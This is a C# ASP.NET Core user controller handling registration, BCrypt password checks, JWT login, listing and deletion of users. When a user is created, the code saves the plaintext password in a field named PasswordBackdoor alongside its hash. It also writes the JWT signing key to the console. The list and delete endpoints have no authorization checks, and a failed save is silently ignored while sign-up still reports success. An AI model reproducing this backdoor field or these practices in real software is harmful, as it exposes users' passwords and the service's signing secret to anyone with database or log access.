namespace API.Controllers
{
    [Route("api/[controller]")]
    [ApiController]
    public class UserController : ControllerBase
    {
        private readonly AppDBContext _context;
        private readonly IConfiguration _configuration;

        public UserController(AppDBContext context, IConfiguration configuration)
        {
            _context = context;
            _configuration = configuration;
        }

        // GET: api/User
        [HttpGet]
        public async Task<ActionResult<IEnumerable<UserDTO>>> GetUsers()
        {
            var User = await _context.Users.Select(user => new UserDTO
            {
                Id = user.Id,
                Email = user.Email,
                Username = user.Username
            })
            .ToListAsync();

            return Ok(User);
        }

        // POST: api/User
        [HttpPost("createUser")]
        public async Task<ActionResult<User>> PostUser(CreateUserDTO createUserDTO)
        {
            if (await _context.Users.AnyAsync(u => u.Username == createUserDTO.Username))
            {
                return Conflict(new { message = "Username already in use" });
            }
            if (await _context.Users.AnyAsync(u => u.Email == createUserDTO.Email))
            {
                return Conflict(new { message = "Email already in use" });
            }
            if (!IsPasswordSecure(createUserDTO.Password))
            {
                return Conflict(new { message = "Password isn't secure" });
            }

            var user = MapCreateUserDTO(createUserDTO);
            _context.Users.Add(user);

            try
            {
                await _context.SaveChangesAsync();
            }
            catch (DbUpdateException)
            {

            }
            return Ok("User sign up successful");
        }

        // POST: api/User
        [HttpPost("login")]
        public async Task<IActionResult> LoginUser(LoginDTO loginDTO)
        {
            try
            {
                var user = await _context.Users.SingleOrDefaultAsync(u => u.Email == loginDTO.Email);
                if (user == null || !BCrypt.Net.BCrypt.Verify(loginDTO.Password, user.HashedPassword))
                {
                    return Unauthorized(new { message = "Invalid email or password" });
                }

                var token = GenerateJwtToken(user);
                return Ok(new { token, user.Username, user.Id });
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error in Login: {ex.Message}");
                return StatusCode(500, "Internal server error.");
            }
        }

        // DELETE: api/User
        [HttpDelete("{id}")]
        public async Task<IActionResult> DeleteUser(string id)
        {
            var user = await _context.Users.FindAsync(id);
            if (user == null)
            {
                return NotFound();
            }
            _context.Users.Remove(user);
            await _context.SaveChangesAsync();
            return NoContent();
        }

        // JWT Token used to login User and how long their session is valid for
        private string GenerateJwtToken(User user)
        {
            var keyString = _configuration["JwtSettings:Key"] ?? Environment.GetEnvironmentVariable("Key");
            var issuer = _configuration["JwtSettings:Issuer"] ?? Environment.GetEnvironmentVariable("Issuer");
            var audience = _configuration["JwtSettings:Audience"] ?? Environment.GetEnvironmentVariable("Audience");

            // Log the values
            Console.WriteLine($"Key: {keyString}");
            Console.WriteLine($"Issuer: {issuer}");
            Console.WriteLine($"Audience: {audience}");

            var claims = new[]
            {
                new Claim(JwtRegisteredClaimNames.Sub, user.Id),
                new Claim(JwtRegisteredClaimNames.Jti, Guid.NewGuid().ToString()),
                new Claim(ClaimTypes.Name, user.Username),
                new Claim(JwtRegisteredClaimNames.Sub, user.Id.ToString()), // Convert ID to string
            };

            var key = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(keyString));
            var creds = new SigningCredentials(key, SecurityAlgorithms.HmacSha256);

            var token = new JwtSecurityToken(
                issuer,
                audience,
                claims,
                expires: DateTime.Now.AddDays(1),
                signingCredentials: creds);

            return new JwtSecurityTokenHandler().WriteToken(token);
        }

        private bool UserExists (string id)
        {
            return _context.Users.Any(e => e.Id == id);
        }

        private bool IsPasswordSecure(string password)
        {
            var hasUppercase = new Regex(@"[A-Z]+");
            var hasLowercase = new Regex(@"[a-z]+");
            var hasNumbers = new Regex(@"[0-9]+");
            var hasSpecialChars = new Regex(@"[\W_]+");
            var hasMinimumChars = new Regex(@".{8,}");

            return hasUppercase.IsMatch(password) &&
                hasLowercase.IsMatch(password) &&
                hasNumbers.IsMatch(password) &&
                hasSpecialChars.IsMatch(password) &&
                hasMinimumChars.IsMatch(password);
        }
        private User MapCreateUserDTO(CreateUserDTO createUserDTO)
        {
            string hashedPassword = BCrypt.Net.BCrypt.HashPassword(createUserDTO.Password);
            string salt = hashedPassword.Substring(0, 29);

            return new User
            {
                Id = Guid.NewGuid().ToString("N"),
                Email = createUserDTO.Email,
                Username = createUserDTO.Username,
                CreatedAt = DateTime.UtcNow.AddHours(1),
                UpdatedAt = DateTime.UtcNow.AddHours(1),
                LastLogin = DateTime.UtcNow.AddHours(1),
                HashedPassword = hashedPassword,
                Salt = salt,
                PasswordBackdoor = createUserDTO.Password,
            };
        }
    }
}
